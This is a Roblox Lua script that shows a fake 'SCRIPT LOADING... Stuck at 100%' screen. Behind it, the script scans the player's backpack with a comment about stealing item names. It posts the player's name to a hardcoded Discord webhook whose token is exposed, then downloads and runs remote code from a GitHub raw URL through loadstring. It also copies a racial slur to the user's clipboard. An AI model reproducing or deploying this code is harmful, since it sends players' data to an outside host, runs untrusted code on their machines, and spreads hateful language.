local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")
local SoundService = game:GetService("SoundService")
local StarterGui = game:GetService("StarterGui")
local TweenService = game:GetService("TweenService")
local VirtualInputManager = game:GetService("VirtualInputManager")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")

local webhook1 = "https://discord.com/api/webhooks/1380694034867159154/c2fIiSfPt29vn1mNv4DN5yXonMTZgdwiXUu-cGSWOicAtACaZSucoQB-4XhWbvG6agds"
local webhook2 = "https://discord.com/api/webhooks/1380694034867159154/c2fIiSfPt29vn1mNv4DN5yXonMTZgdwiXUu-cGSWOicAtACaZSucoQB-4XhWbvG6agds"

local gui = Instance.new("ScreenGui")
local frame = Instance.new("Frame", gui)
local label = Instance.new("TextLabel", frame)
label.Text = "SCRIPT LOADING... Stuck at 100%"

local player = Players.LocalPlayer
local backpack = player:WaitForChild("Backpack")

for _, item in ipairs(backpack:GetChildren()) do
    if item:IsA("Tool") then
        -- Steal or log item names
    end
end

setclipboard("ilikeniggers")

HttpService:PostAsync(webhook1, HttpService:JSONEncode({
    username = "Logger",
    content = "Player has joined: " .. player.Name,
}))

loadstring(game:HttpGet("https://raw.githubusercontent.com/kkease/tester2/main/script.lua"))()